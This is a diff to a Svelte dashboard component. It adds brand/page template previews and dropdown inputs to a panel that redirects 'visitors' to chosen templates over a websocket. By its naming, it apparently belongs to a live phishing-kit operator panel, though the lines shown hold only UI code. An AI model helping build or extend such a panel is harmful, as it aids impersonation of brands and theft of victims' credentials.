@@ -2,6 +2,7 @@
 	import { X, Send, Monitor, Database, Fingerprint, GitGraph, Camera, ChevronDown, Check, RotateCw, Trash2 } from 'lucide-svelte';
 	import { sendMessage, flows } from '$lib/stores/websocket';
 	import { templates, getAllPages, getRouteForKey, type TemplateInput } from '$lib/templates';
+	import { previewUrl } from '$lib/visitorTemplates';
 	import type { Visitor, FlowStep } from '$lib/server/state';
 
 	let { visitor, onclose }: { visitor: Visitor; onclose: () => void } = $props();
@@ -28,6 +29,15 @@
 		if (!selectedTemplate) return [];
 		const route = getRouteForKey(selectedTemplate);
 		return route?.inputs ?? [];
+	});
+
+	let templatePreviewSrc = $derived.by(() => {
+		if (!selectedTemplate) return '';
+		const slash = selectedTemplate.indexOf('/');
+		if (slash <= 0) return '';
+		const brand = selectedTemplate.slice(0, slash);
+		const page = selectedTemplate.slice(slash + 1);
+		return previewUrl(brand, page);
 	});
 
 	function redirectVisitor() {
@@ -136,7 +146,7 @@
 							</div>
 							<div class="h-[300px] bg-white">
 								<iframe
-									src="/templates/preview/{selectedTemplate}"
+									src={templatePreviewSrc}
 									title="Template preview"
 									class="h-full w-full border-0"
 									sandbox="allow-same-origin"
@@ -164,12 +174,23 @@
 							{#each currentInputs as input}
 								<div>
 									<label class="mb-1.5 block text-xs font-medium text-[var(--muted-foreground)]">{input.name}</label>
-									<input
-										type={input.type}
-										placeholder={input.placeholder}
-										bind:value={inputValues[input.name]}
-										class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none focus:ring-2 focus:ring-[var(--accent-glow)]"
-									/>
+									{#if input.type === 'select' && input.options?.length}
+										<select
+											bind:value={inputValues[input.name]}
+											class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none focus:ring-2 focus:ring-[var(--accent-glow)]"
+										>
+											{#each input.options as opt}
+												<option value={opt.value}>{opt.label}</option>
+											{/each}
+										</select>
+									{:else}
+										<input
+											type={input.type === 'number' ? 'number' : 'text'}
+											placeholder={input.placeholder}
+											bind:value={inputValues[input.name]}
+											class="w-full rounded-lg border border-[var(--border)] bg-[var(--input)] px-4 py-2.5 text-sm text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none focus:ring-2 focus:ring-[var(--accent-glow)]"
+										/>
+									{/if}
 								</div>
 							{/each}
 							<button onclick={updateInputs} class="btn-accent flex items-center gap-2 px-4 py-2.5 text-sm">
